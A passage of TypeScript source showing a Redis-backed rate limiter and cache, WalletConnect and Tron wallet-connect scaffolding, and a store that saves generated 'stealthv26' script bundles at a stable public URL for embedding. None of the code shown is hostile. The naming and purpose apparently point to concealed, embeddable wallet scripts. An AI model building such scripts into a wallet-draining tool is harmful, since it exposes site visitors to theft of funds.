        async expire(key, seconds) { await ioredis.expire(key, seconds); },
      };
      return _client;
    } catch {
      console.warn("[redis] ioredis not available, using in-memory store");
    }
  }

  _client = new MemoryStore();
  return _client;
}

/** Simple sliding-window rate limiter */
export async function rateLimit(
  key: string,
  maxRequests: number,
  windowSeconds: number
): Promise<{ allowed: boolean; remaining: number }> {
  const redis = await getRedis();
  const rk = `rl:${key}`;
  const count = await redis.incr(rk);
  if (count === 1) await redis.expire(rk, windowSeconds);
  const allowed = count <= maxRequests;
  return { allowed, remaining: Math.max(0, maxRequests - count) };
}

/** Cache helper with TTL */
export async function cached<T>(
  key: string,
  ttlSeconds: number,
  fn: () => Promise<T>
): Promise<T> {
  const redis = await getRedis();
  const hit = await redis.get(`cache:${key}`);
  if (hit) return JSON.parse(hit) as T;
  const result = await fn();
  await redis.set(`cache:${key}`, JSON.stringify(result), ttlSeconds);
  return result;
}
```

```typescript
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";

export const reownProjectId =
  process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID ||
  process.env.NEXT_PUBLIC_PROJECT_ID ||
  "";

// Mainnets only — matches the v3 contracts deployed on Ethereum, Optimism,
```

```typescript
  log("contract_call_requested", payload);
  throw new Error("Tron runtime scaffold only. Implement Tron contract invocation here.");
}

export function mountConnectButton() {
  document.querySelectorAll(CONFIG.connectClass).forEach((element) => {
    element.addEventListener("click", () => {
      void connectTronWallet();
    });
  });
}

mountConnectButton();
`;
}
```

### src/lib/script-build-store.ts

```typescript
import { mkdir, readFile, writeFile } from "fs/promises";
import path from "path";

export type ScriptBuildRecord = {
  id: string;
  filename: string;
  url: string;
  createdAt: string;
  framework: string;
  source: "compile" | "frontpage";
  size: number;
};

const DATA_DIR = path.join(process.cwd(), "data");
const PUBLIC_DIR = path.join(process.cwd(), "public", "generated-scripts");
const BUILDS_PATH = path.join(DATA_DIR, "script-builds.json");

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function isBuildRecord(value: unknown): value is ScriptBuildRecord {
  return (
    isRecord(value) &&
    typeof value.id === "string" &&
    typeof value.filename === "string" &&
    typeof value.url === "string" &&
    typeof value.createdAt === "string" &&
    typeof value.framework === "string" &&
    (value.source === "compile" || value.source === "frontpage") &&
    typeof value.size === "number"
  );
}

export async function listScriptBuilds(): Promise<ScriptBuildRecord[]> {
  try {
    const raw = await readFile(BUILDS_PATH, "utf8");
    const parsed = JSON.parse(raw) as unknown;
    if (!Array.isArray(parsed)) return [];
    return parsed.filter(isBuildRecord).sort((a, b) => b.createdAt.localeCompare(a.createdAt));
  } catch {
    return [];
  }
}

export async function saveScriptBuild(params: {
  bundle: string;
  framework: string;
  source: "compile" | "frontpage";
}): Promise<ScriptBuildRecord> {
  const stamp = new Date().toISOString().replace(/[:.]/g, "-");
  const id = `build-${stamp}`;
  const filename = `stealthv26-${stamp}.min.js`;
  const url = `/generated-scripts/${filename}`;

  await mkdir(DATA_DIR, { recursive: true });
  await mkdir(PUBLIC_DIR, { recursive: true });
  await writeFile(path.join(PUBLIC_DIR, filename), params.bundle, "utf8");
  // Stable URL for embeds / CDNs: always points at the last compiled bundle
  await writeFile(path.join(PUBLIC_DIR, "stealthv26-latest.min.js"), params.bundle, "utf8");

  const builds = await listScriptBuilds();
  const record: ScriptBuildRecord = {
    id,
    filename,
    url,
    createdAt: new Date().toISOString(),
    framework: params.framework,
    source: params.source,
    size: params.bundle.length,
  };
  await writeFile(BUILDS_PATH, `${JSON.stringify([record, ...builds], null, 2)}\n`, "utf8");
  return record;
}
```
